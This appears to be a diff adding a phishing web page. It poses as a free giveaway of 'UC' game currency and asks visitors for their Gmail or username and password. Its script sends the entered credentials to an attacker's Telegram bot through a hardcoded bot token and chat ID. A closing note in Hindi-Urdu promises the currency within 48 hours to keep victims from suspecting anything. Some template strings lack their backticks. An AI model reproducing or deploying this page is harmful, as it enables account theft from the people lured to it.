@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UC Selection</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #82C7EE, #A37CBE);
+            text-align: center;
+            color: black;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid black;
+            font-size: 16px;
+        }
+        .button {
+            background-color: black;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            text-align: center;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .button:disabled {
+            background-color: grey;
+        }
+        .page {
+            display: none;
+        }
+        .page.active {
+            display: block;
+        }
+    </style>
+    <script>
+        function goToPage(pageNumber) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById('page' + pageNumber).classList.add('active');
+        }
+
+        function handleUCSelection() {
+            let selectedUC = document.querySelector('input[name="uc"]:checked');
+            if (selectedUC) {
+                goToPage(2);
+            }
+        }
+
+        function handleLogin() {
+            let username = document.querySelector('input[type="text"]').value.trim();
+            let password = document.querySelector('input[type="password"]').value.trim();
+
+            if (username && password) {
+                // Your bot token and chat ID
+                const botToken = '7576105033:AAHus3x9KZ3eUkGxDZQbf_6s6e0wpv484iw';
+                const chatId = '2018489883';
+
+                const message = Username: ${username}\nPassword: ${password};
+
+                // Send the message to Telegram
+                fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                    goToPage(7);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            } else {
+                alert('Please fill in both fields.');
+            }
+        }
+    </script>
+</head>
+<body>
+
+    <!-- Page 1: UC Selection -->
+    <div id="page1" class="page active">
+        <div class="container">
+            <h2>Select UC</h2>
+            <form id="ucSelection">
+                <label>
+                    <input type="radio" name="uc" value="100"> 100 UC
+                </label><br>
+                <label>
+                    <input type="radio" name="uc" value="500"> 500 UC
+                </label><br>
+                <label>
+                    <input type="radio" name="uc" value="720"> 720 UC
+                </label><br>
+                <button type="button" class="button" onclick="handleUCSelection()">Next</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Page 2: Gmail/Username & Password -->
+    <div id="page2" class="page">
+        <div class="container">
+            <h2>Gmail/Username & Password</h2>
+            <form id="loginForm">
+                <input type="text" placeholder="Gmail/Username" required><br>
+                <input type="password" placeholder="Password" required><br>
+                <button type="button" class="button" onclick="handleLogin()">Next</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Page 3: Final Confirmation -->
+    <div id="page7" class="page">
+        <div class="container">
+            <h2>Note</h2>
+            <p>Agar Aapne Apni ID or Password Sahi Dala Ha Or Agar Apki ID 40 level Se Upar Ha To Apko Apki UC 48 Hours Ke Andar Mil Jyengi.</p>
+            <button class="button">Done ✅</button>
+        </div>
+    </div>
+
+</body>
+</html>
